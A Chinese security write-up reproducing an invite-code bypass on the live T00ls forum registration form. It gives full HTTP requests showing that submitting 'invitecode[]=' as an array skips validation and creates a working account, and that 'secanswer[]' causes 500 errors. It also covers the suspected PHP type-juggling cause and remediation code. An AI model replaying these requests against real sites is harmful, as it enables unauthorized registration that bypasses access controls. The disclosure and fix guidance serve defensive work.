#  T00ls论坛 注册邀请码校验绕过复现  
原创 0xShe
                    0xShe  安全社   2026-11-22 04:15  
  
T00ls论坛 注册邀请码校验绕过复现  ·  复现报告  
  
一句话结论  
  
邀请码留空会被拦下，提示“没有填写邀请码不能注册”；把   
invitecode[]=  
 提交，邀请码这道校验压根不执行，流程直接走到用户名、邮箱校验，账号注册成功——注册完即登录，全程没有验证码，也没有邮件激活。  
  
关于 T00ls  
<table><tbody><tr><td style="padding: 12px 4px;text-align: center;background: rgb(244, 250, 249);border: 1px solid rgb(223, 238, 236);border-radius: 8px;"><p style="margin: 0px;font-size: 17px;line-height: 1.4;color: rgb(11, 122, 117);font-weight: bold;"><span leaf="">2008.09</span></p><p style="margin: 3px 0px 0px;color: rgb(110, 119, 129);"><span leaf="">正式成立</span></p></td><td style="padding: 12px 4px;text-align: center;background: rgb(244, 250, 249);border: 1px solid rgb(223, 238, 236);border-radius: 8px;"><p style="margin: 0px;font-size: 17px;line-height: 1.4;color: rgb(11, 122, 117);font-weight: bold;"><span leaf="">18 年</span></p><p style="margin: 3px 0px 0px;color: rgb(110, 119, 129);"><span leaf="">走到今天</span></p></td><td style="padding: 12px 4px;text-align: center;background: rgb(244, 250, 249);border: 1px solid rgb(223, 238, 236);border-radius: 8px;"><p style="margin: 0px;font-size: 17px;line-height: 1.4;color: rgb(11, 122, 117);font-weight: bold;"><span leaf="">邀请制</span></p><p style="margin: 3px 0px 0px;color: rgb(110, 119, 129);"><span leaf="">会员门槛</span></p></td></tr></tbody></table>  
T00ls（土司）网络安全社区成立于 2008 年 9 月 22 日，最早以 t00ls.net 域名上线，2022 年 5 月正式启用 t00ls.com。它是国内最早的民间网络安全社区之一，宗旨是“低调求发展”，长期围绕漏洞预警、代码审计、内网渗透、Web 安全这些方向做技术交流，社区不盈利、不带商业性质，靠邀请码控制会员质量。  
  
自 2008 年 9 月算起，到本文测试时的 2026 年 11 月，T00ls 已经走过 18 个年头（2026 年 9 月刚过完 18 周年）。也正因为注册这道门槛一直是邀请码，十八年里它没少被各路安全研究者翻来覆去地试，校验逻辑本该是被捶打得最结实的那一环。可惜这次试出来的，是门板看着还在，锁却没插上——一个空数组，就把整道邀请码校验轻轻绕了过去。  
  
差一个方括号  
  
两次提交只差一处：第一次   
invitecode=  
，第二次   
invitecode%5B%5D=  
。前者被拦，后者直接过了邀请码这一关。  
<table><tbody><tr><td style="padding: 9px 10px;background: rgb(246, 248, 250);border: 1px solid rgb(230, 232, 235);color: rgb(87, 96, 106);font-weight: bold;font-size: 12px;"><section><span leaf="">提交方式</span></section></td><td style="padding: 9px 10px;background: rgb(246, 248, 250);border: 1px solid rgb(230, 232, 235);color: rgb(87, 96, 106);font-weight: bold;font-size: 12px;"><section><span leaf="">响应</span></section></td><td style="padding: 9px 10px;background: rgb(246, 248, 250);border: 1px solid rgb(230, 232, 235);color: rgb(87, 96, 106);font-weight: bold;font-size: 12px;"><section><span leaf="">页面提示</span></section></td></tr><tr><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);word-break: break-all;font-family: Consolas, &#34;Courier New&#34;, monospace;font-size: 12px;"><section><span leaf="">invitecode=</span></section></td><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);color: rgb(110, 119, 129);font-size: 12px;line-height: 1.6;"><section><span leaf="">200</span><span leaf=""><br/></span><span leaf="">11470 B</span></section></td><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);color: rgb(180, 35, 24);"><section><span leaf="">没有填写邀请码不能注册</span></section></td></tr><tr><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);word-break: break-all;font-family: Consolas, &#34;Courier New&#34;, monospace;font-size: 12px;color: rgb(180, 35, 24);"><section><span leaf="">invitecode[]=</span></section></td><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);color: rgb(110, 119, 129);font-size: 12px;line-height: 1.6;"><section><span leaf="">200</span><span leaf=""><br/></span><span leaf="">11464 B</span></section></td><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);color: rgb(31, 136, 61);"><section><span leaf="">该用户名已经被注册</span></section></td></tr></tbody></table>  
返回体只差 6 个字节，但页面已经跳到用户名校验了。也就是说：**不是放行了非法邀请码，是根本没走到邀请码校验这一步**  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/12fJtZooEJ6D5FY4rohWBibGpatYcwExFpEibYaKv9YkAKIicX3UZLggicsoOuXcRjqbx7RVp9qov0xV2gguI31s4jUlZGNpe39dgP9LGENayDQ/640?wx_fmt=png&from=appmsg "")  
  
  
01**游客打开注册页**  
  
GET /register.php HTTP/1.1  
  
Host: www.t00ls.com  
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36  
  
Referer: https://www.t00ls.com/  
  
拿到的是一个 13KB 左右的正常注册表单，关键字段就这么几个：  
  
·  
formhash=412b9f6e  
，游客态下一直是这个值  
  
·  
invitecode  
，必填的邀请码  
  
·  
username / password / password2 / email  
  
·  
tusisecqaaid  
，每次打开页面在 6 到 9 之间变  
  
·  
secanswer  
，安全问题是“T00ls 的宗旨是什么？（5 个汉字）”，答案就写在页面上：低调求发展  
  
顺带确认：页面里没有 seccode、没有 captcha、也没有 turnstile，注册全程不需要过验证码。响应里会种一个 UTH_secq Cookie，是安全问题答案校验用的，同一个会话带着就行。  
  
02**正常提交：空邀请码会被拦**  
  
REQUEST  
  
POST /register.html?regsubmit=yes HTTP/1.1  
  
Host: www.t00ls.com  
  
Content-Type: application/x-www-form-urlencoded  
  
Content-Length: 215  
  
  
formhash=412b9f6e&invitecode=&username=0xShe&password=Zz9%21qwerty285&password2=Zz9%21qwerty285&email=i285probe%40example.invalid&tusisecqaaid=6&secanswer=%E4%BD%8E%E8%B0%83%E6%B1%82%E5%8F%91%E5%B1%95&regsubmit=true  
  
RESPONSE 200 · 11470 bytes  
  
没有填写邀请码不能注册  
  
邀请码这道门是好的，空的确实进不去。  
  
03**只改一个参数：invitecode 换成数组**  
  
请求和上一步一模一样，唯一区别是把   
invitecode=  
 换成   
invitecode%5B%5D=  
，其他字段一个字节没动。  
  
REQUEST · 仅 invitecode 一处改动  
  
POST /register.html?regsubmit=yes HTTP/1.1  
  
Host: www.t00ls.com  
  
Content-Type: application/x-www-form-urlencoded  
  
Content-Length: 221  
  
  
formhash=412b9f6e&invitecode%5B%5D=&username=0xShe&password=Zz9%21qwerty285&password2=Zz9%21qwerty285&email=i285probe%40example.invalid&tusisecqaaid=6&secanswer=%E4%BD%8E%E8%B0%83%E6%B1%82%E5%8F%91%E5%B1%95&regsubmit=true  
  
RESPONSE 200 · 11464 bytes  
  
该用户名已经被注册  
  
邀请码那一步没报错，直接跳到了用户名校验。  
  
04**真去注册一个账号**  
  
REQUEST · 完整注册  
  
POST /register.html?regsubmit=yes HTTP/1.1  
  
Host: www.t00ls.com  
  
Content-Type: application/x-www-form-urlencoded  
  
  
formhash=412b9f6e&invitecode%5B%5D=&username=0xSheNet&password=***&password2=***&email=0xShe%40t00ls.net&tusisecqaaid=2&secanswer=%E4%BD%8E%E8%B0%83%E6%B1%82%E5%8F%91%E5%B1%95&regsubmit=true  
  
同一个会话先 GET 了注册页，formhash 和 tusisecqaaid 取当次的值，password 做了脱敏。  
  
RESPONSE 200 · 12135 bytes  
  
感谢您注册 T00ls，现在将以会员身份登录论坛。  
  
页面顶部导航已经变成登录后的样子，显示用户名 0xSheNet 和“提醒 / 短信 / 退出”。**注册成功了，注册完直接就是登录状态，没有邮件激活这一步。**  
  
05**再单独登录一次，确认账号能用**  
  
REQUEST · 正常登录  
  
POST /logging.html?action=login&loginsubmit=yes HTTP/1.1  
  
Host: www.t00ls.com  
  
Content-Type: application/x-www-form-urlencoded  
  
  
formhash=412b9f6e&referer=https%3A%2F%2Fwww.t00ls.com%2F&username=0xSheNet&password=%3Cmd5(测试口令)%3E&answer=%E4%BD%8E%E8%B0%83%E6%B1%82%E5%8F%91%E5%B1%95&cookietime=2592000&loginsubmit=yes  
  
（登录页会在前端把密码做一次 md5，所以 password 字段填的是口令的 md5 值。）  
  
返回 200、12112 字节，页面显示“欢迎您回来”，同时种下 UTH_auth Cookie。账号密码都正常，是个真能用的会员账号。  
  
几组对照  
  
光看上面，可能还会怀疑是不是别的原因，所以补了几组对照。  
<table><tbody><tr><td style="padding: 9px 10px;background: rgb(246, 248, 250);border: 1px solid rgb(230, 232, 235);color: rgb(87, 96, 106);font-weight: bold;font-size: 12px;"><section><span leaf="">改法</span></section></td><td style="padding: 9px 10px;background: rgb(246, 248, 250);border: 1px solid rgb(230, 232, 235);color: rgb(87, 96, 106);font-weight: bold;font-size: 12px;"><section><span leaf="">结果</span></section></td></tr><tr><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);word-break: break-all;font-family: Consolas, &#34;Courier New&#34;, monospace;font-size: 12px;"><section><span leaf="">INVALID285TESTCODE</span></section></td><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);color: rgb(180, 35, 24);"><section><span leaf="">邀请码不正确（11455 B）</span></section></td></tr><tr><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);word-break: break-all;font-family: Consolas, &#34;Courier New&#34;, monospace;font-size: 12px;"><section><span leaf="">invitecode[]=x / [0]=x / [a]=x</span></section></td><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);color: rgb(31, 136, 61);"><section><span leaf="">该用户名已经被注册（11035 B）</span></section></td></tr><tr><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);font-size: 13px;"><section><span leaf="">数组 + 非法用户名</span></section></td><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);"><section><span leaf="">用户名包含敏感字符</span></section></td></tr><tr><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);font-size: 13px;"><section><span leaf="">数组 + 坏邮箱</span></section></td><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);"><section><span leaf="">Email 地址无效</span></section></td></tr><tr><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);font-size: 13px;"><section><span leaf="">cn.t00ls.com 源站两条路由</span></section></td><td style="padding: 10px;border: 1px solid rgb(230, 232, 235);"><section><span leaf="">同样复现（11041 / 11035 B）</span></section></td></tr></tbody></table>  
正常填一个不存在的邀请码会报“邀请码不正确”，说明系统本来是会校验内容的；数组请求压根没走到那一步，否则也该报这个错。而数组请求后面接什么非法用户名、坏邮箱，报错都跟着变——说明请求确实穿过了邀请码这一关，后面的校验在正常跑。  
  
为什么能绕过去  
  
多半是 PHP 的弱类型比较惹的祸。代码里大概写了类似这样的判断：  
  
PHP  
  
if ($_POST['invitecode'] == '') {  
  
    showmessage('没有填写邀请码不能注册');  
  
    exit;  
  
}  
  
如果 invitecode 传的是数组，PHP 里数组和字符串比较时   
[] == ''  
 结果是 false，于是“没填邀请码”这个拒绝分支不进；后面的邀请码查询、比对也因为拿到的不是字符串，被跳过或吞掉了错误，就这么 fail-open 了。这部分是根据现象推的，具体代码还得看源码才能确定。  
  
顺带提一个同类问题：同一个表单把 secanswer 改成数组（  
secanswer[]  
），能稳定打出 HTTP 500、0 字节响应，典型的 PHP 数组转字符串 fatal。这说明整个注册表单都没做参数类型归一化，不止 invitecode 这一处。  
  
怎么修  
  
核心就一句：期望是字符串的参数，就强制要求它是字符串，不是就拒绝。  
  
PHP · 修复示例  
  
$invitecode = isset($_POST['invitecode'])  
  
    ? trim($_POST['invitecode'])  
  
    : '';  
  
if (!is_string($_POST['invitecode'])  
  
    || $invitecode === '') {  
  
    showmessage('没有填写邀请码不能注册');  
  
}  
  
01  
username、email、secanswer、tusisecqaaid、formhash 也一起加   
is_string  
 判断，传数组或对象直接返回 400，别等它到后面转字符串报错。  
  
02  
邀请码别再用“是不是空的”来判断，老老实实查库：存在吗、用过没、过期没、是不是绑在这次注册上，任何一项不对就终止。校验中出现类型异常，按失败处理，不要跳过。  
  
03  
补点兜底：邀请码一次性消耗加并发占用校验、注册加频率限制和验证码（现在注册页连验证码都没有）、注册后加个邮箱验证（现在是注册完直接登录）。  
  
04  
回归测试：  
invitecode=  
 和   
invitecode[]=  
 应该返回同一个拒绝提示，都不能进到用户名校验、不能开号；顺便把   
secanswer[]  
 那个 500 也一起销掉。  
  
T00LS.NET · EST. 2008  
  
欢迎大家注册 T00ls 论坛  
  
一个走过了十八年的民间安全社区，低调求发展，也低调做技术。邀请码请走官方渠道申请，注册之后欢迎来漏洞预警、代码审计、内网渗透这些板块交流。  
  
本文仅用于安全研究与授权范围内的复现，请勿用于未授权测试。文中涉及的测试账号为专门注册，未读取或改动任何真实用户数据。  
  
如果这篇复现对你有帮助，点个「在看」，转给做安全的朋友。  
  
  
